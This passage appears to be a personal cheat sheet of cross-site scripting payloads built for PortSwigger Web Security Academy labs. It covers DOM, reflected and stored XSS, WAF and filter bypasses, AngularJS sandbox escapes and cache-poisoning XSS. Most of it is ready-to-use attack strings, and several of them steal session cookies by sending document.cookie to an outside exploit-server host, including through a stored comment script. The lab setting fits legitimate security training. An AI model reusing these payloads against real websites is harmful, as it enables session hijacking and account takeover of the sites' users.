location.hash and passed to jQuery.parseHTML
To exploit it you can use



<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>


----------------------------------------------------------------------------------

In the search bar when there is a Cross-site scripting (reflected)
"onmouseover="alert(1)

----------------------------------------------------------------------------------

In some cases insert this into the javascript code
-alert(1)- OR "-alert(1)-" OR to bypass document cookie filter use "-alert(window["document"]["cookie"])-" This way of bypassing is exploiting through global variable

Example to Bypass (double encode (on the point character), and other encoding as follow:)
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit-ace61f411f22344280191eb3016d00ea%252eweb-security-academy%252enet%2F%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term="-(window["document"]["location"]="https://exploit-ace61f411f22344280191eb3016d00ea%2eweb-security-academy%2enet//?"+window["document"]["cookie"])-"';
location='https://ac701f751f8f348b80171ec10036004a.web-security-academy.net/?search_term="-(window["document"]["location"]="https://exploit-ace61f411f22344280191eb3016d00ea.web-security-academy.net//?"+window["document"]["cookie"])-"';

Final Payload:
<script>
location='https://0a3b0073048f9f64c09f603800e300d4.web-security-academy.net/?SearchTerm=%22-%28window%5b"document"%5d%5b"location"%5d="https%3A%2F%2Fexploit-0ad8007804719f42c071600b013200c0%252eweb-security-academy%252enet%2F%3F%22%2Bwindow%5b%22document%22%5d%5b%22cookie%22%5d%29-"'
</script>

----------------------------------------------------------------------------------

"></select><img%20src=1%20onerror=alert(1)>

----------------------------------------------------------------------------------

Javascript
{{$on.constructor('alert(1)')()}}

----------------------------------------------------------------------------------

Reflected DOM XSS
\"-alert(1)}// 
The "//" is to comment the code in Javascript to mantain the syntax correct 

----------------------------------------------------------------------------------

Escape restrictions
<><img src=1 onerror=alert(1)>

----------------------------------------------------------------------------------

Sometimes use burp intruder in case the tags aren't allowed, try to bruteforce it with the list of tags available on this page:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
insert this "<§§>" to place a payload

Example of a payload to deliver to the victim to cause a print 
<iframe src="https://0a8d00c5044f1270c00943c5008200a1.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 

This will cause a print()

----------------------------------------------------------------------------------

Custom payload to bypass WAFs

<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

USE THE DECODER TO UNDERSTAND IT
This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.

----------------------------------------------------------------------------------

Another common payload
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
"><svg><animatetransform onbegin=alert(1)> or "><svg><animatetransform onbegin=alert(1)>//

----------------------------------------------------------------------------------

This alert could be trigged by ALT+SHIFT+X or CTRL+ALT+X
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
'accesskey='x'onclick='alert(1)

To trigger the exploit on yourself, press one of the following key combinations:
On Windows: ALT+SHIFT+X
On MacOS: CTRL+ALT+X
On Linux: Alt+X

----------------------------------------------------------------------------------

\';alert(1)//139
\'-alert(1)//
</script><script>alert(1)</script>


Another payload to put into the link with an onclick event

http://foo?&apos;-alert(1)-&apos;
http://foo?'-alert(1)-'

For
In case of this common template to make evidence of XSS:

                       <script>
                            var message = `0 search results for 'sad'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
                        
use 

 ${alert(1)}
 
 ----------------------------------------------------------------------------------

 
 <svg><a><animate+attributeName=href+values=javascript:alert(1) /><text+x=20+y=20>Click me</text></a>

Example for a Stored XSS to retrive cookie session through comment

<script>document.location='//exploit-0adb00eb0408b931c0c44d7d01d90077.web-security-academy.net/'+document.cookie</script>

This exploit will redirect the user, once the request is loaded to your exploit server, where you can find his own cookie session




--------------------------------------------------------------------------

Example of Reflected XSS through a cookie, in mix with cache poisoning (remember to test the exploit with the cache buster)

request

GET /?c=12 HTTP/1.1
Host: 0af4009303eacff9c0044ae1009c009f.web-security-academy.net
Upgrade-Insecure-Requests: 1
Cookie:fehost=someString"-alert(1)-"someString

response (part of it)

       <script>
            data = {
                "host":"0af4009303eacff9c0044ae1009c009f.web-security-academy.net",
                "path":"/",
                "frontend":"someString"-alert(1)-"someString"
            }
        </script>
